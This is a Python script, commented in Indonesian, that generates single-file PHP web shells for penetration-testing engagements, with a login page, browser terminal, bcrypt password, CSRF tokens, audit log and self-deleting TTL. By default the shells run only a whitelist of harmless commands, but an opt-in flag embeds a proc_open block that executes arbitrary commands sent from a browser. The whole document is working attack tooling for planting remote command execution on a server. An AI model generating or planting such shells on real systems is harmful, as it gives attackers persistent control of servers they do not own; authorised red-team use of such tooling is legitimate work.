#!/usr/bin/env python3
"""shell/web_shell_gen.py — generator shell SATU FILE (HTML+CSS+JS+PHP).

Dua varian (--variant):
  cli  : tanpa UI, gate Basic 401 + header Authorization, whitelist command.
         Paling aman — untuk program yang melarang shell interaktif.
  web  : halaman login HTML (tanpa popup Basic Auth), terminal di browser,
         whitelist saja. "Mode bebas" (perintah arbitrer via proc_open) TIDAK
         ikut di build default; harus diminta eksplisit lewat --allow-free-mode.
  default keduanya (both).

HARDENING varian web:
  - mode bebas opt-in (--allow-free-mode) + peringatan tegas ke stderr
  - cookie sesi: HttpOnly=1, SameSite=Strict, Secure hanya bila HTTPS terdeteksi
  - CSRF token per-session (random_bytes(32) -> bin2hex) + hash_equals
  - idle timeout 900 s + rate limit login (5 gagal -> jeda 300 s)
  - login wajib POST; kredensial di query string ditolak

Keduanya: bcrypt cost 12, TTL auto-unlink, audit log, tanpa eval/uploader/
revshell. Nama file 32-hex acak. Kredensial -> CREDENTIALS-<ts>.txt.
File hasil generate (dan file kredensial) dipaksa mode 600 + diverifikasi.

Standalone (tidak mengimpor exploit.py). bcrypt butuh venv:
  /home/lota1337/myenv/bin/python web_shell_gen.py --out <dir> --ttl 24 [--variant web]
"""
from __future__ import annotations

import argparse
import os
import secrets
import stat
import sys
import time
from pathlib import Path

import bcrypt

HEX = "0123456789abcdef"
ALLOWED_DEFAULT = ["id", "whoami", "uname -a", "pwd", "hostname", "php -v"]

# Blok PHP mode bebas: hanya disisipkan bila --allow-free-mode diberikan.
FREE_PHP = r"""if ($act === 'cmd' && ($_POST['c'] ?? '') === '__free__') {
    if (!logged_in()) { audit('cmd-noauth'); deny(401, 'authentication required'); }
    if (!csrf_check()) { audit('csrf-fail', 'freecmd'); deny(403, 'invalid csrf token'); }
    $cmd = $_POST['cmd'] ?? '';
    $cmd = is_string($cmd) ? $cmd : '';
    if (trim($cmd) === '') { deny(400, 'empty cmd'); }
    audit('exec-free', $cmd);
    $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $proc = proc_open($cmd, $desc, $pipes);
    if (!is_resource($proc)) { deny(500, 'proc_open gagal'); }
    $out = (string)stream_get_contents($pipes[1], MAX_OUT)
         . (string)stream_get_contents($pipes[2], MAX_OUT);
    fclose($pipes[1]); fclose($pipes[2]); proc_close($proc);
    header('Content-Type: text/plain; charset=utf-8');
    echo substr($out, 0, MAX_OUT); exit;
}
"""

# Checkbox mode bebas (UI terminal).
FREE_UI = """<span id="freewrap"><input type="checkbox" id="cbfree"> mode bebas</span>"""

# JS mode bebas: deklarasi + init.
FREE_JS_DECL = """const cbf=document.getElementById('cbfree');
function FREE(){return !!(cbf&&cbf.checked);}
function PUT(fd,cmd){if(FREE()){fd.append('c','__free__');fd.append('cmd',cmd);}else{fd.append('c',cmd);}}"""

FREE_JS_INIT = """cbf.addEventListener('change',()=>{modeEl.textContent=cbf.checked?'BEBAS':'whitelist';
  modeEl.style.color=cbf.checked?'var(--er)':'var(--dim)';});
w("centang 'mode bebas' utk perintah apa pun, mis: ls -la /var/www/html");"""

# Varian whitelist-only: API sama, tanpa jejak mode bebas sama sekali.
SAFE_JS_DECL = """function FREE(){return false;}
function PUT(fd,cmd){fd.append('c',cmd);}"""


def _rand_name() -> str:
    return "".join(secrets.choice(HEX) for _ in range(32)) + ".php"


def _q(v: str) -> str:
    return "'" + v.replace("\\", "\\\\").replace("'", "\\'") + "'"


def _warn_free_mode() -> None:
    print(
        "PERINGATAN: shell varian web menyertakan MODE BEBAS — checkbox "
        "'mode bebas' memanggil proc_open() sehingga perintah ARBITRER bisa "
        "dijalankan dari browser. Hanya untuk engagement yang mengizinkan "
        "demonstrasi eksekusi penuh; hapus shell segera setelah engagement.",
        file=sys.stderr,
    )


def render(*, password: str, ttl_hours: float, variant: str,
           allowed: list[str] | None = None,
           allow_free_mode: bool = False) -> str:
    h = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)).decode()
    expires = int(time.time() + ttl_hours * 3600)
    allowed_php = "[" + ",".join(_q(a) for a in (allowed or ALLOWED_DEFAULT)) + "]"
    if variant == "cli":
        return _cli_tpl(h, expires, allowed_php)
    if allow_free_mode:
        _warn_free_mode()
    return _web_tpl(h, expires, allowed_php, allow_free_mode=allow_free_mode)


def _cli_tpl(h: str, expires: int, allowed_php: str) -> str:
    tpl = r"""<?php
/**
 * Managed CLI shell — engagement use only. Whitelist-only.
 * Menerima password via POST/GET 'k' ATAU header HTTP Basic (browser popup).
 * Auto-unlink setelah TTL. Tanpa eval/uploader/revshell.
 */
declare(strict_types=1);
const PW_HASH = %HASH%;
const EXPIRES = %EXPIRES%;
const ALLOWED = %ALLOWED%;
const LOGFILE = __DIR__ . '/.shell-audit.log';
const MAX_OUT = 8192;
function audit(string $e, string $x = ''): void {
    @file_put_contents(LOGFILE, sprintf("%s\t%s\t%s\n", gmdate('c'),
        $_SERVER['REMOTE_ADDR'] ?? '-', $e . ($x !== '' ? ' ' . $x : '')), FILE_APPEND | LOCK_EX);
}
function deny(int $c, string $m): void { http_response_code($c); echo $m, "\n"; exit; }
if (time() > EXPIRES) { audit('expired'); @unlink(__FILE__); @unlink(LOGFILE); deny(410, 'gone'); }
$provided = $_POST['k'] ?? $_GET['k'] ?? '';
if ($provided === '' && !empty($_SERVER['PHP_AUTH_PW'])) { $provided = $_SERVER['PHP_AUTH_PW']; }
if ($provided === '' && !empty($_SERVER['HTTP_AUTHORIZATION'])) {
    $h = $_SERVER['HTTP_AUTHORIZATION'];
    if (stripos($h, 'basic ') === 0) {
        $d = base64_decode(substr($h, 6), true);
        if (is_string($d) && str_contains($d, ':')) { $provided = explode(':', $d, 2)[1]; }
    }
}
if ($provided === '') { audit('no-credential');
    header('WWW-Authenticate: Basic realm="restricted"'); deny(401, 'authentication required'); }
if (!password_verify($provided, PW_HASH)) { audit('auth-fail'); deny(401, 'authentication required'); }
$c = $_POST['c'] ?? $_GET['c'] ?? '';
if ($c === '') { audit('authenticated no-command'); header('Content-Type: text/plain');
    echo "ok\nallowed:\n  " . implode("\n  ", ALLOWED) . "\n"; exit; }
if (!in_array($c, ALLOWED, true)) { audit('exec-reject', $c); deny(403, 'command not in whitelist'); }
audit('exec', $c);
header('Content-Type: text/plain; charset=utf-8');
echo substr(shell_exec(escapeshellcmd($c) . ' 2>&1') ?: '', 0, MAX_OUT);
"""
    return tpl.replace("%HASH%", _q(h)).replace("%EXPIRES%", str(expires)).replace("%ALLOWED%", allowed_php)


def _web_tpl(h: str, expires: int, allowed_php: str, *, allow_free_mode: bool) -> str:
    tpl = r"""<?php
/**
 * Managed WEB shell — one file (HTML+CSS+JS+PHP). engagement use only.
 * Login POST-only (kredensial tidak pernah lewat URL), terminal browser,
 * whitelist%FREEMODE%, CSRF per-session, idle timeout, rate limit login,
 * audit log, TTL auto-unlink. Tanpa eval()/uploader/revshell.
 */
declare(strict_types=1);
const PW_HASH = %HASH%;
const EXPIRES = %EXPIRES%;
const ALLOWED = %ALLOWED%;
const LOGFILE = __DIR__ . '/.shell-audit.log';
const MAX_OUT = 65536;
const IDLE_TIMEOUT = 900;      // 900 detik (15 menit) tanpa aktivitas -> sesi mati
const MAX_LOGIN_FAIL = 5;      // gagal login per sesi sebelum dipaksa jeda
const LOGIN_LOCK = 300;        // detik jeda setelah MAX_LOGIN_FAIL
const HEADER_TTL = 10;         // detik sebelum header dikirim (unlink aman)

function audit(string $e, string $x = ''): void {
    @file_put_contents(LOGFILE, sprintf("%s\t%s\t%s\t%s\n", gmdate('c'),
        $_SERVER['REMOTE_ADDR'] ?? '-', $e, substr($x, 0, 120)), FILE_APPEND | LOCK_EX);
}
function deny(int $code, string $msg): void { http_response_code($code); echo $msg, "\n"; exit; }
function jout(array $d, int $code = 200): void {
    http_response_code($code); header('Content-Type: application/json');
    echo json_encode($d); exit;
}
function e(string $s): string { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

/** HTTPS dideteksi dari server, tidak di-hardcode. */
function is_https(): bool {
    $h = strtolower((string)($_SERVER['HTTPS'] ?? ''));
    if ($h !== '' && $h !== 'off' && $h !== '0') { return true; }
    if ((string)($_SERVER['SERVER_PORT'] ?? '') === '443') { return true; }
    return strtolower((string)($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '')) === 'https';
}

function start_session(): void {
    $secure = is_https();
    session_set_cookie_params([
        'lifetime' => 0,
        'path'     => '/',
        'secure'   => $secure,   // Secure hanya bila kanal HTTPS terdeteksi
        'httponly' => true,      // JS tidak boleh membaca cookie sesi
        'samesite' => 'Strict',  // cookie tidak ikut request lintas-situs
    ]);
    ini_set('session.use_strict_mode', '1');
    ini_set('session.use_only_cookies', '1');
    ini_set('session.cookie_httponly', '1');
    ini_set('session.cookie_samesite', 'Strict');
    if ($secure) { ini_set('session.cookie_secure', '1'); }
    session_start();
}

/** Token CSRF per-session: 32 byte acak (CSPRNG), hex 64 karakter. */
function csrf(): string {
    if (empty($_SESSION['csrf']) || !is_string($_SESSION['csrf'])) {
        $_SESSION['csrf'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf'];
}
function csrf_check(): bool {
    $t = $_POST['t'] ?? '';
    if (!is_string($t) || $t === '') { return false; }
    $s = $_SESSION['csrf'] ?? '';
    return is_string($s) && $s !== '' && hash_equals($s, $t);
}
function logged_in(): bool { return isset($_SESSION['ok']) && $_SESSION['ok'] === true; }
function session_touch(): void { $_SESSION['last_seen'] = time(); }
function idle_expired(): bool {
    if (!logged_in()) { return false; }
    $last = (int)($_SESSION['last_seen'] ?? 0);
    return $last > 0 && (time() - $last) > IDLE_TIMEOUT;
}
function kill_session(): void { $_SESSION = []; session_destroy(); }

if (time() > EXPIRES) { audit('expired'); @unlink(__FILE__); @unlink(LOGFILE); deny(410, 'gone'); }
if (session_status() !== PHP_SESSION_ACTIVE) { start_session(); }
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: no-referrer');
header('X-Frame-Options: DENY');
header('Cache-Control: no-store');

// Tidak ada jalur kredensial/aksi lewat query string.
foreach (['k', 'p', 'c', 't', 'a'] as $qk) {
    if (isset($_GET[$qk]) && $_GET[$qk] !== '') { audit('cred-in-url', $qk); deny(400, 'credentials must be POSTed'); }
}
$method = $_SERVER['REQUEST_METHOD'] ?? '';
$act = $_POST['a'] ?? '';
$act = is_string($act) ? $act : '';
if ($act !== '' && $method !== 'POST') { audit('bad-method', $act); deny(405, 'method not allowed'); }
if (idle_expired()) { audit('idle-timeout'); kill_session(); deny(401, 'session idle timeout'); }
if (logged_in()) { session_touch(); }

if ($act === 'login') {
    if (logged_in()) { jout(['ok' => true, 'csrf' => csrf()]); }
    if (!csrf_check()) { audit('csrf-fail', 'login');
        jout(['ok' => false, 'err' => 'token tidak valid, muat ulang halaman'], 403); }
    $locked = (int)($_SESSION['lock_until'] ?? 0);
    if ($locked > time()) {
        $wait = $locked - time(); header('Retry-After: ' . $wait); audit('login-locked');
        jout(['ok' => false, 'err' => 'terlalu banyak percobaan, tunggu ' . $wait . ' detik'], 429);
    }
    $p = $_POST['k'] ?? '';
    $p = is_string($p) ? $p : '';
    if ($p !== '' && password_verify($p, PW_HASH)) {
        session_regenerate_id(true);
        $tok = csrf();
        $_SESSION['ok'] = true; $_SESSION['last_seen'] = time();
        unset($_SESSION['fails'], $_SESSION['lock_until']);
        audit('login-ok');
        jout(['ok' => true, 'csrf' => $tok]);
    }
    $fails = (int)($_SESSION['fails'] ?? 0) + 1;
    $_SESSION['fails'] = $fails;
    audit('login-fail', (string)$fails);
    usleep(300000);                            // delay minimal 0,3 s per gagal
    if ($fails >= MAX_LOGIN_FAIL) {
        $_SESSION['fails'] = 0;
        $_SESSION['lock_until'] = time() + LOGIN_LOCK;
        header('Retry-After: ' . LOGIN_LOCK); audit('login-lock');
        jout(['ok' => false, 'err' => 'terlalu banyak percobaan, tunggu ' . LOGIN_LOCK . ' detik'], 429);
    }
    jout(['ok' => false, 'err' => 'password salah'], 401);
}
if ($act === 'logout') {
    if (!logged_in()) { audit('logout-noauth'); deny(401, 'authentication required'); }
    if (!csrf_check()) { audit('csrf-fail', 'logout'); deny(403, 'invalid csrf token'); }
    audit('logout'); kill_session();
    header('Content-Type: application/json'); echo json_encode(['ok' => true]); exit;
}
%FREE_PHP%if ($act === 'cmd') {
    if (!logged_in()) { audit('cmd-noauth'); deny(401, 'authentication required'); }
    if (!csrf_check()) { audit('csrf-fail', 'cmd'); deny(403, 'invalid csrf token'); }
    $c = $_POST['c'] ?? '';
    $c = is_string($c) ? $c : '';
    if (!in_array($c, ALLOWED, true)) { audit('exec-reject', $c); deny(403, 'command not in whitelist'); }
    audit('exec', $c);
    header('Content-Type: text/plain; charset=utf-8');
    echo substr(shell_exec(escapeshellcmd($c) . ' 2>&1') ?: '', 0, MAX_OUT); exit;
}
if (!logged_in()): audit('page-login');
?><!doctype html>
<html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>restricted</title>
<style>
:root{--bg:#0b0f14;--fg:#d7e0ea;--ac:#37c882;--er:#ff5f56}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.5 ui-monospace,monospace;display:grid;place-items:center;min-height:100vh}
.card{background:#111820;border:1px solid #1f2a36;border-radius:10px;padding:32px;min-width:320px}
h1{font-size:15px;margin:0 0 18px;color:var(--ac);letter-spacing:2px}
input{width:100%;padding:10px 12px;background:#0b0f14;border:1px solid #2a3644;color:var(--fg);border-radius:6px;font:inherit;outline:none}
input:focus{border-color:var(--ac)}
button{margin-top:14px;width:100%;padding:10px;background:#132a20;border:1px solid var(--ac);color:var(--ac);border-radius:6px;font:inherit;cursor:pointer}
button:hover{background:#1a3a2c}
.err{color:var(--er);font-size:12px;margin-top:10px;min-height:16px}
.ttl{text-align:center;color:#5a6b7d;font-size:11px;margin-top:16px}
</style></head><body>
<div class="card"><h1>&#9679; RESTRICTED SHELL</h1>
<form id="f" method="post" action="">
<input type="hidden" name="a" value="login">
<input type="hidden" name="t" value="<?= e(csrf()) ?>">
<input id="k" name="k" type="password" placeholder="password" autofocus autocomplete="off">
<button type="submit">MASUK</button><div class="err" id="e"></div></form>
<div class="ttl">sesi diaudit &middot; ttl otomatis</div></div>
<script>
document.getElementById('f').addEventListener('submit', async (ev) => {
  ev.preventDefault();
  const r = await fetch(location.href, {method:'POST', body:new FormData(ev.target),
    credentials:'same-origin'});
  let j = {};
  try { j = await r.json(); } catch (x) { j = {}; }
  if (j.ok) location.reload();
  else document.getElementById('e').textContent = j.err || ('gagal (' + r.status + ')');
});
</script></body></html>
<?php else: audit('page-term');
?><!doctype html>
<html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>shell</title>
<meta name="csrf" content="<?= e(csrf()) ?>">
<style>
:root{--bg:#0b0f14;--fg:#d7e0ea;--ac:#37c882;--er:#ff5f56;--dim:#5a6b7d}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--fg);font:13px/1.5 ui-monospace,monospace;height:100vh;display:flex;flex-direction:column}
header{padding:8px 14px;border-bottom:1px solid #1f2a36;display:flex;gap:12px;align-items:center}
header b{color:var(--ac)} header .sp{flex:1}
header button{background:none;border:1px solid #2a3644;color:var(--dim);border-radius:5px;padding:3px 10px;cursor:pointer;font:inherit}
header button:hover{color:var(--er);border-color:var(--er)}
#out{flex:1;overflow-y:auto;padding:14px;white-space:pre-wrap;word-break:break-word}
.in{display:flex;gap:8px;padding:10px 14px;border-top:1px solid #1f2a36;align-items:center}
.ps{color:var(--ac)}
.in input[type=text]{flex:1;background:transparent;border:none;color:var(--fg);font:inherit;outline:none}
#freewrap{margin-left:10px;color:var(--dim);font-size:12px;display:flex;align-items:center;gap:5px}
</style></head><body>
<header><b>shell</b><span id="who" style="color:var(--dim)"></span><span class="sp"></span>
<span id="mode" style="color:var(--dim)">whitelist</span>
<button id="x">keluar</button></header>
<div id="out"></div>
<div class="in"><span class="ps">$</span>
<input id="cmd" type="text" autofocus autocomplete="off" spellcheck="false">
%FREE_UI%</div>
<script>
const out=document.getElementById('out'),inp=document.getElementById('cmd'),
      modeEl=document.getElementById('mode'),
      TOKEN=document.querySelector('meta[name="csrf"]').content;
%FREE_DECL%
function w(t){out.textContent+=t+"\n";out.scrollTop=out.scrollHeight;}
w("whitelist: id / whoami / uname -a / pwd / hostname / php -v");
%FREE_INIT%
async function run(cmd){
  if(!cmd.trim())return; w((FREE()?'# ':'$ ')+cmd);
  const fd=new FormData();fd.append('a','cmd');fd.append('t',TOKEN);
  PUT(fd,cmd);
  const r=await fetch(location.href,{method:'POST',body:fd,credentials:'same-origin'});
  if(r.status===401){location.reload();return;}
  const t=await r.text(); w(t||"(kosong)");
}
inp.addEventListener('keydown',async ev=>{if(ev.key==='Enter'){const v=inp.value;inp.value='';await run(v);}});
document.getElementById('x').addEventListener('click',async()=>{
  const fd=new FormData();fd.append('a','logout');fd.append('t',TOKEN);
  await fetch(location.href,{method:'POST',body:fd,credentials:'same-origin'});location.reload();});
(function(){const fd=new FormData();fd.append('a','cmd');fd.append('t',TOKEN);PUT(fd,'id');
  fetch(location.href,{method:'POST',body:fd,credentials:'same-origin'})
    .then(r=>r.text()).then(t=>{document.getElementById('who').textContent=t.split("\n")[0];w(t);});})();
</script></body></html><?php endif; """
    return (tpl
            .replace("%HASH%", _q(h))
            .replace("%EXPIRES%", str(expires))
            .replace("%ALLOWED%", allowed_php)
            .replace("%FREEMODE%", " + mode bebas (opt-in)" if allow_free_mode else "")
            .replace("%FREE_PHP%", FREE_PHP if allow_free_mode else "")
            .replace("%FREE_UI%", FREE_UI if allow_free_mode else "")
            .replace("%FREE_DECL%", FREE_JS_DECL if allow_free_mode else SAFE_JS_DECL)
            .replace("%FREE_INIT%", FREE_JS_INIT if allow_free_mode else ""))


def _verifikasi_600(path: Path) -> None:
    """Pastikan mode 600 BENAR-BENAR berlaku; gagal keras bila tidak.

    Filesystem yang tidak menegakkan permission POSIX (NTFS/exFAT via fuseblk,
    vfat, sebagian FUSE) mengabaikan chmod tanpa error: file tetap 0666/0777.
    Shell berpassword + kredensialnya tidak boleh terbaca user lain.
    """
    mode = stat.S_IMODE(path.stat().st_mode)
    if mode & 0o077:
        raise PermissionError(
            f"{path}: mode {oct(mode)} — filesystem tidak menegakkan chmod 600 "
            f"(NTFS/exFAT/FUSE?). Shell/kredensial TIDAK boleh ditulis ke sini; "
            f"pakai --out di filesystem POSIX (mis. ~/out atau /tmp)."
        )


def _chmod_600_ketat(path: Path) -> None:
    """chmod 600 untuk file sensitif + verifikasi hasilnya."""
    os.chmod(path, stat.S_IRUSR | stat.S_IWUSR)
    _verifikasi_600(path)


def main() -> int:
    ap = argparse.ArgumentParser(description="generate web/CLI shell satu file")
    ap.add_argument("--out", required=True, help="folder output (dibuat bila belum ada)")
    ap.add_argument("--ttl", type=float, default=24, help="umur shell (jam)")
    ap.add_argument("--variant", choices=["web", "cli", "both"], default="both",
                    help="web=browser+login (whitelist); cli=whitelist Basic; both (default)")
    ap.add_argument("--allow-free-mode", action="store_true",
                    help="HANYA untuk engagement yang mengizinkan eksekusi penuh: "
                         "menyertakan checkbox 'mode bebas' + proc_open (perintah arbitrer)")
    ap.add_argument("--author", default="anonymous")
    args = ap.parse_args()

    if args.ttl <= 0:
        print("DITOLAK: --ttl harus > 0 jam", file=sys.stderr)
        return 2

    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)
    password = secrets.token_urlsafe(18)
    ts = int(time.time())
    lines = [
        "MANAGED SHELL — engagement use only",
        f"author   : {args.author}",
        f"generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}",
        f"ttl      : {args.ttl} jam",
        f"password : {password}",
        f"free mode: {'YA (proc_open, perintah arbitrer)' if args.allow_free_mode else 'tidak (whitelist saja)'}",
        "",
    ]
    for v in (["web", "cli"] if args.variant == "both" else [args.variant]):
        p = out / _rand_name()
        p.write_text(render(password=password, ttl_hours=args.ttl, variant=v,
                            allow_free_mode=args.allow_free_mode), encoding="utf-8")
        _chmod_600_ketat(p)
        lines.append(f"variant {v:4s}: {p.name}")
        print(f"[+] {v:4s}: {p}  (mode 600)")
    cred = out / f"CREDENTIALS-{ts}.txt"
    cred.write_text("\n".join(lines) + "\n", encoding="utf-8")
    _chmod_600_ketat(cred)
    print(f"[+] credentials: {cred}")
    if args.allow_free_mode:
        print("[!] mode bebas aktif di varian web — hapus shell setelah engagement.",
              file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
